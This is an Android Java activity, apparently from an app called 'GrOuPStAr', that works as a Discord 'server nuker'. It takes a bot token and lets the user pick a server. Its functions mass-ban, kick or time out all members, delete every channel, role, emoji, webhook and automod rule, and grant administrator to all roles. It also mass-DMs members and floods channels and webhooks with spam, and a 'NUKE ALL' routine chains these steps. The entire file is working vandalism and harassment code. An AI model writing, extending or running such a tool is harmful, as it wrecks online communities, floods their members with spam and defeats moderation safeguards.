package com.groupstar.app;

import android.app.Activity;
import android.app.AlertDialog;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.widget.*;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import okhttp3.*;

public class NukerActivity extends Activity {

    private static final String API = "https://discord.com/api/v10";
    private static final MediaType JSON = MediaType.get("application/json; charset=utf-8");

    private OkHttpClient http;
    private ExecutorService pool = Executors.newFixedThreadPool(8);
    private Handler ui = new Handler(Looper.getMainLooper());

    private String botToken = "";
    private String selectedGuildId = "";
    private String selectedGuildName = "";

    private EditText etBotToken;
    private ListView serverList;
    private LinearLayout stepToken, stepServers, stepOps;
    private TextView tvLog, tvSelectedServer;
    private List<String[]> guilds = new ArrayList<>(); // {id, name}

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_nuker);

        http = new OkHttpClient.Builder()
            .connectTimeout(10, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .build();

        etBotToken    = findViewById(R.id.etBotToken);
        serverList    = findViewById(R.id.serverList);
        stepToken     = findViewById(R.id.stepToken);
        stepServers   = findViewById(R.id.stepServers);
        stepOps       = findViewById(R.id.stepOps);
        tvLog         = findViewById(R.id.tvLog);
        tvSelectedServer = findViewById(R.id.tvSelectedServer);

        findViewById(R.id.btnClose).setOnClickListener(v -> finish());
        findViewById(R.id.btnFetchServers).setOnClickListener(v -> fetchServers());
        findViewById(R.id.btnBackToServers).setOnClickListener(v -> showStep(2));

        serverList.setOnItemClickListener((parent, view, pos, id) -> {
            String[] g = guilds.get(pos);
            selectedGuildId   = g[0];
            selectedGuildName = g[1];
            tvSelectedServer.setText("Server: " + selectedGuildName);
            showStep(3);
        });

        bindOpButtons();
    }

    private void bindOpButtons() {
        bind(R.id.btnBan,            () -> banMembers());
        bind(R.id.btnKick,           () -> kickMembers());
        bind(R.id.btnPrune,          () -> pruneMembers());
        bind(R.id.btnTimeout,        () -> timeoutAll());
        bind(R.id.btnMassDM,         () -> massDM());
        bind(R.id.btnRenameMembers,  () -> renameAllMembers());
        bind(R.id.btnDelChannels,    () -> deleteChannels());
        bind(R.id.btnCreateChannels, () -> createChannels());
        bind(R.id.btnDelRoles,       () -> deleteRoles());
        bind(R.id.btnCreateRoles,    () -> createRoles());
        bind(R.id.btnRenameChannels, () -> renameAllChannels());
        bind(R.id.btnRenameRoles,    () -> renameAllRoles());
        bind(R.id.btnSpam,           () -> spamChannels());
        bind(R.id.btnWebhookSpam,    () -> webhookSpam());
        bind(R.id.btnGiveAdmin,      () -> giveAdminAll());
        bind(R.id.btnRenameServer,   () -> renameServer());
        bind(R.id.btnDelEmojis,      () -> deleteEmojis());
        bind(R.id.btnDisableAutomod, () -> disableAutomod());
        bind(R.id.btnDelWebhooks,    () -> deleteWebhooks());
        bind(R.id.btnLeave,          () -> confirmThenRun("Leave server?", () -> leaveServer()));
        bind(R.id.btnNukeAll,        () -> confirmThenRun("☢ NUKE ALL — are you sure?", () -> nukeAll()));
    }

    private void bind(int id, Runnable action) {
        View v = findViewById(id);
        if (v != null) v.setOnClickListener(x -> pool.submit(action));
    }

    private void confirmThenRun(String msg, Runnable action) {
        ui.post(() -> new AlertDialog.Builder(this)
            .setMessage(msg)
            .setPositiveButton("GO", (d, w) -> pool.submit(action))
            .setNegativeButton("Cancel", null)
            .show());
    }

    // ──────────────────────────────────────────────────────────────────
    // HTTP helpers
    // ──────────────────────────────────────────────────────────────────

    private Response get(String url) throws IOException {
        return http.newCall(new Request.Builder()
            .url(url)
            .header("Authorization", "Bot " + botToken)
            .get().build()).execute();
    }

    private int post(String url, String body) throws IOException {
        try (Response r = http.newCall(new Request.Builder()
            .url(url)
            .header("Authorization", "Bot " + botToken)
            .post(RequestBody.create(body.getBytes(), JSON)).build()).execute()) {
            return r.code();
        }
    }

    private int patch(String url, String body) throws IOException {
        try (Response r = http.newCall(new Request.Builder()
            .url(url)
            .header("Authorization", "Bot " + botToken)
            .patch(RequestBody.create(body.getBytes(), JSON)).build()).execute()) {
            return r.code();
        }
    }

    private int delete(String url) throws IOException {
        try (Response r = http.newCall(new Request.Builder()
            .url(url)
            .header("Authorization", "Bot " + botToken)
            .delete().build()).execute()) {
            return r.code();
        }
    }

    private int put(String url, String body) throws IOException {
        try (Response r = http.newCall(new Request.Builder()
            .url(url)
            .header("Authorization", "Bot " + botToken)
            .put(RequestBody.create(body.getBytes(), JSON)).build()).execute()) {
            return r.code();
        }
    }

    // ──────────────────────────────────────────────────────────────────
    // UI helpers
    // ──────────────────────────────────────────────────────────────────

    private void log(String msg) {
        ui.post(() -> tvLog.append("\n" + msg));
    }

    private void showStep(int step) {
        ui.post(() -> {
            stepToken.setVisibility(step == 1 ? View.VISIBLE : View.GONE);
            stepServers.setVisibility(step == 2 ? View.VISIBLE : View.GONE);
            stepOps.setVisibility(step == 3 ? View.VISIBLE : View.GONE);
        });
    }

    // ──────────────────────────────────────────────────────────────────
    // Fetch guilds
    // ──────────────────────────────────────────────────────────────────

    private void fetchServers() {
        botToken = etBotToken.getText().toString().trim();
        if (botToken.isEmpty()) { toast("Enter a token"); return; }
        log("Fetching servers...");
        pool.submit(() -> {
            try {
                Response r = get(API + "/users/@me/guilds");
                String body = r.body().string();
                JSONArray arr = new JSONArray(body);
                guilds.clear();
                List<String> names = new ArrayList<>();
                for (int i = 0; i < arr.length(); i++) {
                    JSONObject g = arr.getJSONObject(i);
                    String id   = g.getString("id");
                    String name = g.getString("name");
                    guilds.add(new String[]{id, name});
                    names.add((i+1) + ". " + name);
                }
                ui.post(() -> {
                    serverList.setAdapter(new ArrayAdapter<>(this,
                        android.R.layout.simple_list_item_1, names));
                    showStep(2);
                });
                log("Found " + guilds.size() + " servers.");
            } catch (Exception e) { log("Error: " + e.getMessage()); }
        });
    }

    // ──────────────────────────────────────────────────────────────────
    // Member operations
    // ──────────────────────────────────────────────────────────────────

    private JSONArray fetchMembers() throws Exception {
        JSONArray all = new JSONArray();
        String lastId = "0";
        while (true) {
            Response r = get(API + "/guilds/" + selectedGuildId
                + "/members?limit=1000&after=" + lastId);
            JSONArray chunk = new JSONArray(r.body().string());
            if (chunk.length() == 0) break;
            for (int i = 0; i < chunk.length(); i++) all.put(chunk.get(i));
            lastId = chunk.getJSONObject(chunk.length()-1).getJSONObject("user").getString("id");
        }
        return all;
    }

    private void banMembers() {
        log("Banning all members...");
        try {
            JSONArray members = fetchMembers();
            int count = 0;
            for (int i = 0; i < members.length(); i++) {
                String uid = members.getJSONObject(i).getJSONObject("user").getString("id");
                put(API + "/guilds/" + selectedGuildId + "/bans/" + uid,
                    "{\"delete_message_days\":7}");
                count++;
                if (count % 10 == 0) log("Banned " + count + "...");
            }
            log("Done. Banned " + count + " members.");
        } catch (Exception e) { log("Error: " + e.getMessage()); }
    }

    private void kickMembers() {
        log("Kicking all members...");
        try {
            JSONArray members = fetchMembers();
            int count = 0;
            for (int i = 0; i < members.length(); i++) {
                String uid = members.getJSONObject(i).getJSONObject("user").getString("id");
                delete(API + "/guilds/" + selectedGuildId + "/members/" + uid);
                count++;
            }
            log("Done. Kicked " + count + ".");
        } catch (Exception e) { log("Error: " + e.getMessage()); }
    }

    private void pruneMembers() {
        log("Pruning members (30 days)...");
        try {
            post(API + "/guilds/" + selectedGuildId + "/prune",
                "{\"days\":30,\"compute_prune_count\":false}");
            log("Prune started.");
        } catch (Exception e) { log("Error: " + e.getMessage()); }
    }

    private void timeoutAll() {
        log("Timing out all members (7 days)...");
        try {
            JSONArray members = fetchMembers();
            String until = java.time.Instant.now()
                .plusSeconds(7 * 24 * 3600).toString();
            int count = 0;
            for (int i = 0; i < members.length(); i++) {
                String uid = members.getJSONObject(i).getJSONObject("user").getString("id");
                patch(API + "/guilds/" + selectedGuildId + "/members/" + uid,
                    "{\"communication_disabled_until\":\"" + until + "\"}");
                count++;
            }
            log("Done. Timed out " + count + ".");
        } catch (Exception e) { log("Error: " + e.getMessage()); }
    }

    private void massDM() {
        log("Sending mass DMs...");
        try {
            JSONArray members = fetchMembers();
            int count = 0;
            for (int i = 0; i < members.length(); i++) {
                String uid = members.getJSONObject(i).getJSONObject("user").getString("id");
                // open DM channel
                Response dmR = http.newCall(new Request.Builder()
                    .url(API + "/users/@me/channels")
                    .header("Authorization", "Bot " + botToken)
                    .post(RequestBody.create(
                        ("{\"recipient_id\":\"" + uid + "\"}").getBytes(), JSON)).build()).execute();
                if (dmR.isSuccessful()) {
                    String chanId = new JSONObject(dmR.body().string()).getString("id");
                    for (int x = 0; x < 10; x++) {
                        post(API + "/channels/" + chanId + "/messages",
                            "{\"content\":\"GrOuPStAr\"}");
                    }
                    count++;
                }
            }
            log("Done. DMed " + count + ".");
        } catch (Exception e) { log("Error: " + e.getMessage()); }
    }

    private void renameAllMembers() {
        log("Renaming all members...");
        try {
            JSONArray members = fetchMembers();
            int count = 0;
            for (int i = 0; i < members.length(); i++) {
                String uid = members.getJSONObject(i).getJSONObject("user").getString("id");
                patch(API + "/guilds/" + selectedGuildId + "/members/" + uid,
                    "{\"nick\":\"GrOuPStAr\"}");
                count++;
            }
            log("Done. Renamed " + count + ".");
        } catch (Exception e) { log("Error: " + e.getMessage()); }
    }

    // ──────────────────────────────────────────────────────────────────
    // Channel operations
    // ──────────────────────────────────────────────────────────────────

    private JSONArray fetchChannels() throws Exception {
        Response r = get(API + "/guilds/" + selectedGuildId + "/channels");
        return new JSONArray(r.body().string());
    }

    private void deleteChannels() {
        log("Deleting all channels...");
        try {
            JSONArray channels = fetchChannels();
            int count = 0;
            for (int i = 0; i < channels.length(); i++) {
                String cid = channels.getJSONObject(i).getString("id");
                delete(API + "/channels/" + cid);
                count++;
            }
            log("Done. Deleted " + count + " channels.");
        } catch (Exception e) { log("Error: " + e.getMessage()); }
    }

    private void createChannels() {
        log("Creating 100 channels...");
        try {
            for (int i = 1; i <= 100; i++) {
                post(API + "/guilds/" + selectedGuildId + "/channels",
                    "{\"name\":\"nuked-" + i + "\",\"type\":0}");
                if (i % 10 == 0) log("Created " + i + "...");
            }
            log("Done. 100 channels created.");
        } catch (Exception e) { log("Error: " + e.getMessage()); }
    }

    private void renameAllChannels() {
        log("Renaming all channels...");
        try {
            JSONArray channels = fetchChannels();
            int count = 0;
            for (int i = 0; i < channels.length(); i++) {
                String cid = channels.getJSONObject(i).getString("id");
                patch(API + "/channels/" + cid,
                    "{\"name\":\"nuked\"}");
                count++;
            }
            log("Done. Renamed " + count + ".");
        } catch (Exception e) { log("Error: " + e.getMessage()); }
    }

    private void spamChannels() {
        log("Spamming channels (50 msgs each)...");
        try {
            JSONArray channels = fetchChannels();
            for (int i = 0; i < channels.length(); i++) {
                JSONObject ch = channels.getJSONObject(i);
                if (ch.getInt("type") != 0) continue;
                String cid = ch.getString("id");
                for (int x = 0; x < 50; x++) {
                    post(API + "/channels/" + cid + "/messages",
                        "{\"content\":\"GrOuPStAr\"}");
                }
            }
            log("Spam done.");
        } catch (Exception e) { log("Error: " + e.getMessage()); }
    }

    // ──────────────────────────────────────────────────────────────────
    // Role operations
    // ──────────────────────────────────────────────────────────────────

    private JSONArray fetchRoles() throws Exception {
        Response r = get(API + "/guilds/" + selectedGuildId + "/roles");
        return new JSONArray(r.body().string());
    }

    private void deleteRoles() {
        log("Deleting all roles...");
        try {
            JSONArray roles = fetchRoles();
            int count = 0;
            for (int i = 0; i < roles.length(); i++) {
                String rid = roles.getJSONObject(i).getString("id");
                delete(API + "/guilds/" + selectedGuildId + "/roles/" + rid);
                count++;
            }
            log("Done. Deleted " + count + " roles.");
        } catch (Exception e) { log("Error: " + e.getMessage()); }
    }

    private void createRoles() {
        log("Creating roles...");
        try {
            for (int i = 1; i <= 50; i++) {
                post(API + "/guilds/" + selectedGuildId + "/roles",
                    "{\"name\":\"nuked-" + i + "\"}");
            }
            log("Done. 50 roles created.");
        } catch (Exception e) { log("Error: " + e.getMessage()); }
    }

    private void renameAllRoles() {
        log("Renaming roles...");
        try {
            JSONArray roles = fetchRoles();
            int count = 0;
            for (int i = 0; i < roles.length(); i++) {
                String rid = roles.getJSONObject(i).getString("id");
                patch(API + "/guilds/" + selectedGuildId + "/roles/" + rid,
                    "{\"name\":\"nuked\"}");
                count++;
            }
            log("Done. Renamed " + count + ".");
        } catch (Exception e) { log("Error: " + e.getMessage()); }
    }

    private void giveAdminAll() {
        log("Giving admin to all roles...");
        try {
            JSONArray roles = fetchRoles();
            for (int i = 0; i < roles.length(); i++) {
                String rid = roles.getJSONObject(i).getString("id");
                // permissions = ADMINISTRATOR (8)
                patch(API + "/guilds/" + selectedGuildId + "/roles/" + rid,
                    "{\"permissions\":\"8\"}");
            }
            // Also assign all roles to all members
            JSONArray members = fetchMembers();
            for (int i = 0; i < members.length(); i++) {
                String uid = members.getJSONObject(i).getJSONObject("user").getString("id");
                for (int j = 0; j < roles.length(); j++) {
                    String rid = roles.getJSONObject(j).getString("id");
                    put(API + "/guilds/" + selectedGuildId + "/members/" + uid + "/roles/" + rid, "");
                }
            }
            log("Done. Admin given.");
        } catch (Exception e) { log("Error: " + e.getMessage()); }
    }

    // ──────────────────────────────────────────────────────────────────
    // Server operations
    // ──────────────────────────────────────────────────────────────────

    private void renameServer() {
        log("Renaming server...");
        try {
            patch(API + "/guilds/" + selectedGuildId,
                "{\"name\":\"nuked by GrOuPStAr\"}");
            log("Server renamed.");
        } catch (Exception e) { log("Error: " + e.getMessage()); }
    }

    private void deleteEmojis() {
        log("Deleting emojis...");
        try {
            Response r = get(API + "/guilds/" + selectedGuildId + "/emojis");
            JSONArray emojis = new JSONArray(r.body().string());
            for (int i = 0; i < emojis.length(); i++) {
                String eid = emojis.getJSONObject(i).getString("id");
                delete(API + "/guilds/" + selectedGuildId + "/emojis/" + eid);
            }
            log("Done. Deleted " + emojis.length() + " emojis.");
        } catch (Exception e) { log("Error: " + e.getMessage()); }
    }

    private void disableAutomod() {
        log("Disabling automod...");
        try {
            Response r = get(API + "/guilds/" + selectedGuildId + "/auto-moderation/rules");
            JSONArray rules = new JSONArray(r.body().string());
            for (int i = 0; i < rules.length(); i++) {
                String rid = rules.getJSONObject(i).getString("id");
                delete(API + "/guilds/" + selectedGuildId + "/auto-moderation/rules/" + rid);
            }
            log("Automod disabled. Deleted " + rules.length() + " rules.");
        } catch (Exception e) { log("Error: " + e.getMessage()); }
    }

    private void deleteWebhooks() {
        log("Deleting webhooks...");
        try {
            Response r = get(API + "/guilds/" + selectedGuildId + "/webhooks");
            JSONArray wh = new JSONArray(r.body().string());
            for (int i = 0; i < wh.length(); i++) {
                String wid = wh.getJSONObject(i).getString("id");
                delete(API + "/webhooks/" + wid);
            }
            log("Done. Deleted " + wh.length() + " webhooks.");
        } catch (Exception e) { log("Error: " + e.getMessage()); }
    }

    private void webhookSpam() {
        log("Creating + spamming webhooks...");
        try {
            JSONArray channels = fetchChannels();
            List<String> wUrls = new ArrayList<>();
            for (int i = 0; i < channels.length(); i++) {
                JSONObject ch = channels.getJSONObject(i);
                if (ch.getInt("type") != 0) continue;
                String cid = ch.getString("id");
                Response r = http.newCall(new Request.Builder()
                    .url(API + "/channels/" + cid + "/webhooks")
                    .header("Authorization", "Bot " + botToken)
                    .post(RequestBody.create(
                        "{\"name\":\"nuker\"}".getBytes(), JSON)).build()).execute();
                if (r.isSuccessful()) {
                    JSONObject w = new JSONObject(r.body().string());
                    wUrls.add("https://discord.com/api/webhooks/" + w.getString("id") + "/" + w.getString("token"));
                }
            }
            log("Created " + wUrls.size() + " webhooks. Spamming...");
            for (String wUrl : wUrls) {
                for (int i = 0; i < 20; i++) {
                    try {
                        http.newCall(new Request.Builder().url(wUrl)
                            .post(RequestBody.create(
                                "{\"content\":\"GrOuPStAr\"}".getBytes(), JSON)).build()).execute();
                    } catch (Exception ignored) {}
                }
            }
            log("Webhook spam done.");
        } catch (Exception e) { log("Error: " + e.getMessage()); }
    }

    private void leaveServer() {
        log("Leaving server...");
        try {
            delete(API + "/users/@me/guilds/" + selectedGuildId);
            log("Left server.");
            ui.post(() -> showStep(2));
        } catch (Exception e) { log("Error: " + e.getMessage()); }
    }

    // ──────────────────────────────────────────────────────────────────
    // NUKE ALL
    // ──────────────────────────────────────────────────────────────────

    private void nukeAll() {
        log("☢ NUKE ALL STARTED");
        try {
            log("Step 1: Deleting channels...");
            deleteChannels();

            log("Step 2: Deleting roles...");
            deleteRoles();

            log("Step 3: Creating 200 channels...");
            for (int i = 1; i <= 200; i++) {
                post(API + "/guilds/" + selectedGuildId + "/channels",
                    "{\"name\":\"nuked-" + i + "\",\"type\":0}");
                if (i % 20 == 0) log("Created " + i + " channels...");
            }

            log("Step 4: Creating webhooks on all channels...");
            JSONArray channels = fetchChannels();
            List<String> wUrls = new ArrayList<>();
            for (int i = 0; i < channels.length(); i++) {
                JSONObject ch = channels.getJSONObject(i);
                if (ch.getInt("type") != 0) continue;
                String cid = ch.getString("id");
                try {
                    Response r = http.newCall(new Request.Builder()
                        .url(API + "/channels/" + cid + "/webhooks")
                        .header("Authorization", "Bot " + botToken)
                        .post(RequestBody.create("{\"name\":\"nuker\"}".getBytes(), JSON)).build()).execute();
                    if (r.isSuccessful()) {
                        JSONObject w = new JSONObject(r.body().string());
                        wUrls.add("https://discord.com/api/webhooks/" + w.getString("id") + "/" + w.getString("token"));
                    }
                } catch (Exception ignored) {}
            }
            log("Got " + wUrls.size() + " webhooks. Spamming forever (30 rounds)...");

            // Spam 30 rounds
            for (int round = 0; round < 30; round++) {
                for (String wUrl : wUrls) {
                    try {
                        http.newCall(new Request.Builder().url(wUrl)
                            .post(RequestBody.create("{\"content\":\"@everyone GrOuPStAr\"}".getBytes(), JSON)).build()).execute();
                    } catch (Exception ignored) {}
                }
                log("Spam round " + (round+1) + "/30 done.");
            }

            log("Step 5: Mass DM...");
            massDM();

            log("Step 6: Rename server...");
            renameServer();

            log("☢ NUKE ALL COMPLETE.");
        } catch (Exception e) { log("Nuke error: " + e.getMessage()); }
    }

    private void toast(String msg) {
        ui.post(() -> Toast.makeText(this, msg, Toast.LENGTH_SHORT).show());
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        pool.shutdownNow();
    }
}
